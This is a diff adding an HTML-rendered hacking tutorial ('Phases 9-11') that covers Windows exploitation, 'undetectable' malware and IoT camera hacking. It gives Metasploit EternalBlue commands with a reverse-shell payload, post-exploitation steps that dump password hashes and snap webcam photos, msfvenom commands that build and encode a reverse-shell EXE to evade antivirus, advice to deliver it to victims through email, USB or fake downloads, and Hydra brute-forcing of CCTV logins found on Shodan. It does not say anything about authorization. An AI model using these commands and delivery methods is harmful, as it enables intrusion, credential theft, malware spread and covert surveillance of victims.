@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>&#x1f534; Phase 9&colon; Windows Exploitation &ndash; Gaining Full Control</title>
+            <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only],
+.vscode-high-contrast:not(.vscode-high-contrast-light) img[src$=\#gh-light-mode-only],
+.vscode-high-contrast-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+</style>
+            
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+<style>
+:root {
+  --color-note: #0969da;
+  --color-tip: #1a7f37;
+  --color-warning: #9a6700;
+  --color-severe: #bc4c00;
+  --color-caution: #d1242f;
+  --color-important: #8250df;
+}
+
+</style>
+<style>
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-note: #2f81f7;
+    --color-tip: #3fb950;
+    --color-warning: #d29922;
+    --color-severe: #db6d28;
+    --color-caution: #f85149;
+    --color-important: #a371f7;
+  }
+}
+
+</style>
+<style>
+.markdown-alert {
+  padding: 0.5rem 1rem;
+  margin-bottom: 16px;
+  color: inherit;
+  border-left: .25em solid #888;
+}
+
+.markdown-alert>:first-child {
+  margin-top: 0
+}
+
+.markdown-alert>:last-child {
+  margin-bottom: 0
+}
+
+.markdown-alert .markdown-alert-title {
+  display: flex;
+  font-weight: 500;
+  align-items: center;
+  line-height: 1
+}
+
+.markdown-alert .markdown-alert-title .octicon {
+  margin-right: 0.5rem;
+  display: inline-block;
+  overflow: visible !important;
+  vertical-align: text-bottom;
+  fill: currentColor;
+}
+
+.markdown-alert.markdown-alert-note {
+  border-left-color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-note .markdown-alert-title {
+  color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-important {
+  border-left-color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-important .markdown-alert-title {
+  color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-warning {
+  border-left-color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-warning .markdown-alert-title {
+  color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-tip {
+  border-left-color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-tip .markdown-alert-title {
+  color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-caution {
+  border-left-color: var(--color-caution);
+}
+
+.markdown-alert.markdown-alert-caution .markdown-alert-title {
+  color: var(--color-caution);
+}
+
+</style>
+        
+        </head>
+        <body class="vscode-body vscode-light">
+            <link rel="stylesheet" href="style.css">
+<blockquote>
+<p><strong>🔥 Now we’re diving into Advanced Hacking Techniques, including Windows Exploitation, Malware Development, and IoT Hacking. Get ready to level up your skills! 🚀😈</strong>
+--</p>
+</blockquote>
+<h1 id="-phase-9-windows-exploitation--gaining-full-control">🔴 Phase 9: Windows Exploitation – Gaining Full Control</h1>
+<blockquote>
+<p><strong>Key Point:</strong></p>
+<blockquote>
+<p><strong>&quot;Windows is the most used OS, making it a prime target for hackers. We'll use Metasploit and PowerShell attacks to exploit Windows machines.&quot;</strong>
+--</p>
+</blockquote>
+</blockquote>
+<h2 id="-scenario-exploiting-a-windows-system-using-eternalblue">🎯 Scenario: Exploiting a Windows System Using EternalBlue</h2>
+<blockquote>
+<p><strong>EternalBlue (MS17-010) is a famous exploit used by WannaCry ransomware.</strong>
+--</p>
+</blockquote>
+<h3 id="️-tools-used"><strong>🛠️ Tools Used:</strong></h3>
+<ul>
+<li><strong>Metasploit</strong></li>
+<li><strong>EternalBlue Exploit</strong></li>
+</ul>
+<h3 id="step-1-start-metasploit">Step 1: Start Metasploit</h3>
+<pre><code class="language-bash">msfconsole
+</code></pre>
+<h3 id="step-2-load-eternalblue-exploit">Step 2: Load EternalBlue Exploit</h3>
+<pre><code class="language-bash">use exploit/windows/smb/ms17_010_eternalblue
+<span class="hljs-built_in">set</span> RHOSTS TARGET_IP
+<span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp
+<span class="hljs-built_in">set</span> LHOST YOUR_IP
+exploit
+</code></pre>
+<p><strong>✔ If successful, you’ll get a Meterpreter session, giving you full control over the system!</strong></p>
+<h3 id="step-3-control-the-windows-machine">Step 3: Control the Windows Machine</h3>
+<p><strong>After exploitation, run:</strong></p>
+<pre><code class="language-bash">sysinfo  <span class="hljs-comment"># Get system info  </span>
+hashdump  <span class="hljs-comment"># Dump all user passwords  </span>
+screenshot  <span class="hljs-comment"># Take a screenshot  </span>
+webcam_snap  <span class="hljs-comment"># Capture a photo from the webcam  </span>
+</code></pre>
+<p><strong>✔ You now control the target machine! 🔥</strong></p>
+<hr>
+<h1 id="-phase-10-creating-undetectable-malware">🔴 Phase 10: Creating Undetectable Malware</h1>
+<p><strong>Modern antivirus software detects most hacking tools, so we need to create FUD (Fully Undetectable) malware.</strong></p>
+<h2 id="-scenario-creating-a-reverse-shell-that-bypasses-antivirus">🎯 Scenario: Creating a Reverse Shell That Bypasses Antivirus</h2>
+<p>--</p>
+<h3 id="️-tools-used-1"><strong>🛠️ Tools Used:</strong></h3>
+<ul>
+<li><strong>Mingw-w64 Compiler</strong></li>
+<li><strong>Veil-Evasion</strong></li>
+<li><strong>MSFvenom</strong></li>
+</ul>
+<h3 id="step-1-generate-a-malicious-exe-file">Step 1: Generate a Malicious EXE File</h3>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe &gt; malware.exe
+</code></pre>
+<h3 id="step-2-encode-it-to-bypass-antivirus">Step 2: Encode It to Bypass Antivirus</h3>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 --encrypt xor --encrypt-key supersecret -f exe &gt; undetectable.exe
+</code></pre>
+<p><strong>✔ Now, this file is harder to detect by AV software.</strong></p>
+<h3 id="step-3-deliver-malware-via-social-engineering">Step 3: Deliver Malware via Social Engineering</h3>
+<p><strong>Send the undetectable.exe to the victim via email, USB, or fake software downloads. Once executed, you get a reverse shell to their PC.</strong></p>
+<hr>
+<h1 id="-phase-11-iot-hacking--exploiting-smart-devices">🔴 Phase 11: IoT Hacking – Exploiting Smart Devices</h1>
+<p><strong>IoT devices (CCTV, smart home systems, routers) often have weak security. We will exploit them using Mirai Botnet techniques.</strong></p>
+<h2 id="-scenario-hacking-a-cctv-camera">🎯 Scenario: Hacking a CCTV Camera</h2>
+<h3 id="️-tools-used-2"><strong>🛠️ Tools Used:</strong></h3>
+<ul>
+<li><strong>Shodan</strong></li>
+<li><strong>Mirai</strong></li>
+<li><strong>Hydra</strong></li>
+</ul>
+<h3 id="step-1-find-vulnerable-devices-using-shodan">Step 1: Find Vulnerable Devices Using Shodan</h3>
+<pre><code class="language-bash">shodan search <span class="hljs-string">&quot;webcam&quot;</span>
+</code></pre>
+<p><strong>✔ This lists exposed CCTV cameras online.</strong></p>
+<h3 id="step-2-bruteforce-the-login-with-hydra">Step 2: Bruteforce the Login with Hydra</h3>
+<pre><code class="language-bash">hydra -l admin -P rockyou.txt TARGET_IP http-form-post <span class="hljs-string">&quot;/login:username=^USER^&amp;password=^PASS^:F=Incorrect&quot;</span>
+</code></pre>
+<p><strong>✔ If successful, you gain access to the CCTV camera feed! 😈</strong></p>
+
+            
+            
+        </body>
+        </html>
